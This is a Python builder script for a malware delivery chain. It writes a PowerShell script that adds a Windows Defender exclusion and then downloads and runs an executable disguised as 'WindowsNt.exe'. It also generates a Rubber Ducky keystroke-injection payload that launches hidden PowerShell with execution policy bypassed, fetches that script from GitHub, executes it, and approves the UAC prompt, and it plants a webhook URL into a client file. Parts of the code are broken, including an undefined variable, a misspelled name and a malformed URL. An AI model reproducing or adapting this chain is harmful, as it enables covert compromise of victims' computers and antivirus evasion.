import os
import sys
import json
from datetime import datetime

debug = True
'''
webhook = os.getenv('WEBHOOK')
client = os.getenv('CLIENT_USERNAME')
date = datetime.now().strftime("%d_%m_%Y")
time = datetime.now().strftime("%H_%M_%S")
'''
repo = os.getenv('GITHUB_REPOSITORY')


webhook = 'httsps://hwhhwu7188nznz.con'
client = 'sakib'
date = datetime.now().strftime("%d_%m_%Y")
time = datetime.now().strftime("%H_%M_%S")

star = lambda : print('*'*50)
def list_vars():
    print(webhook)
    print(client)
    print(repo)
    star(),

def setup_webhook():
    content = f"webhook = \'{webhook}\'\n"
    with open('WindowsNt.py','r') as r:
        content += r.read()
    with open('WindowsNt.py','w') as w:
        w.write(content)
        if debug:
            print('WindowsNt.py')
            print(content)
            star()

def setup_powershell():
    script = f'$path="C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Temp";Set-MpPreference -ExclusionPath $path;Invoke-WebRequest -Uri "https://github.com/{repo_url}/releases/{client}/download/{client}.exe" -OutFile "$env:TEMP\WindowsNt.exe";Start-Process "$env:TEMP\WindowsNt.exe"exit;\n'
    with open(f'{client}.ps1','w') as w:
        w.write(script)
        if debug:
            print(f'{client}.ps1')
            print(script)
            star()

def setup_payload():
    payload = f'DELAY 2000\nGUI r\nDELAY 1000\nSTRING powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Invoke-Expression (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/{repo}/refs/heads/main/{client}.ps1" -UseBasicParsing).Content"\nDELAY 1000\nCTRL SHIFT ENTER\nDELAY 2000\nALT y\n'
    with open('payload.dd','w') as w:
        w.write(payload)
        if debug:
            print('payload.dd')
            print(paylod)
            star()

def main():
    if debug:
        list_vars
    setup_webhook()
    setup_powershell()
    setup_payload()

if __name__ == '__main__':
    main()
